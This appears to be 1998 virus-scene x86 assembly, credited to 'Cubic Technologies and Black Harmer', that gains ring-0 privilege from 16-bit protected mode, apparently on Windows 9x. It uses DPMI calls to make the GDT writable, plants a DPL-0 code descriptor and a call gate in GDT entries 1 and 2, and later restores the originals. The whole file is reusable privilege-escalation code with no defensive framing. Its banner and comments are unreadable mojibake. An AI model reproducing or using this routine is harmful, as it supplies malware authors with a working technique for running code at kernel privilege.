;    Copr. (c) 1998  Cubic Techologies and Black Harmer presents
;
;            �����ۿ   �ۿ  ��ۿ �ۿ  �����ۿ     ����ۿ
;            ����Ĳ��  ���  �������� ��������    ����Ĳ��
;            ��������  ���  ��ڱ���� ��� ����    ��������
;            ��ڰ���   ���  �������� ��� ����    ����ٰ��
;            �������   ���  ��� ���� ��������    ��������
;            ��� ���   ���  ���  ���  �������     ������
;
;��������������������������� RING0 16 bit �����������������������������������
open_RING0_16prot_function:
        pusha
        push     ds es
        call     init_open_RING0_16prot_function
init_open_RING0_16prot_function:
        pop      bp
        sub      bp,offset(init_open_RING0_16prot_function-open_RING0_16prot_function)
        sgdt     fword ptr ds:[bp+GDT_DES-open_RING0_16prot_function]
        mov      al,byte ptr ds:[bp+GDT_DES-open_RING0_16prot_function+5]
        mov      byte ptr ds:[bp+GDT_DES-open_RING0_16prot_function+7],al
        mov      word ptr ds:[bp+GDT_DES-open_RING0_16prot_function+5],0F2h
        xor      ax,ax
        mov      cx,1
        int      31h
        ;AX - Selector
        mov      ds:[bp+GDT_SEL-open_RING0_16prot_function],ax
        mov      bx,ax
        mov      ax,0Ch
        push     ds
        pop      es
        lea      di,[bp+GDT_DES-open_RING0_16prot_function]
        int      31h
        ;����p� �p�� GDT_SEL �� ����� ��p������ � GDT
        ;���p���� ��p� GDT ���p���p� � �����ᠬ� 0 � 1
        mov      cx,10h
        mov      si,8
        mov      ds,ds:[bp+GDT_SEL-open_RING0_16prot_function]
        lea      di,[bp+OLD_GDT_DES_1-open_RING0_16prot_function]
        rep      movsb ;DS:[SI] -> ES:[DI]
        ;�������� ���� ���p���p� � GDT � �����ᠬ� 0 � 1
        ;��p�� �㤥� ��� ᥣ���� � DPL=0
        ;��p�� �㤥� ��
        mov      bx,cs
        mov      ax,0Bh
        lea      di,[bp+OUR_GDT_DES_1-open_RING0_16prot_function]
        int      31h
        mov      byte ptr es:[bp+OUR_GDT_DES_1-open_RING0_16prot_function+5],9Ah
        ;H���p������ ��p�� ���p���p (GATE16)
        lea      bx,[bp+RING0_16prot_procedure-open_RING0_16prot_function]
        mov      word ptr es:[bp+OUR_GDT_DES_2-open_RING0_16prot_function],bx
        ;��p���ᨬ ��� ���p���p� � GDT
        push     ds es
        pop      ds es
        mov      cx,10h
        lea      si,[bp+OUR_GDT_DES_1-open_RING0_16prot_function]
        mov      es,ds:[bp+GDT_SEL-open_RING0_16prot_function]
        mov      di,8h
        rep      movsb ;DS:[SI] -> ES:[DI]
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
close_RING0_16prot_function:
        pusha
        push     ds es
        call     init_close_RING0_16prot_function
init_close_RING0_16prot_function:
        pop      bp
        sub      bp,offset(init_close_RING0_16prot_function-close_RING0_16prot_function)
        mov      cx,10h
        lea      si,[bp+OLD_GDT_DES_1-close_RING0_16prot_function]
        mov      es,ds:[bp+GDT_SEL-close_RING0_16prot_function]
        mov      di,8h
        rep      movsb ;DS:[SI] -> ES:[DI]
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
RING0_16prot_function:
        db       009Ah
        dw       0000h
        dw       0013h
        retn
;����������������������������������������������������������������������������
RING0_16prot_procedure:
        call     di
        retf
;����������������������������������������������������������������������������
GDT_SEL          dw  0
GDT_DES          db  0,0,0,0,0,0,0,0
;����������������������������������������������������������������������������
OLD_GDT_DES_1    db  8h dup (0)
OLD_GDT_DES_2    db  8h dup (0)
;����������������������������������������������������������������������������
OUR_GDT_DES_1    db  8h dup (0)
OUR_GDT_DES_2    dw  0000h ;�㤠 ������ JMP
                 dw  0008h ;������p
                 db  0
                 db  0E4h
                 dw  0
;��������������������������������� EOF ��������������������������������������
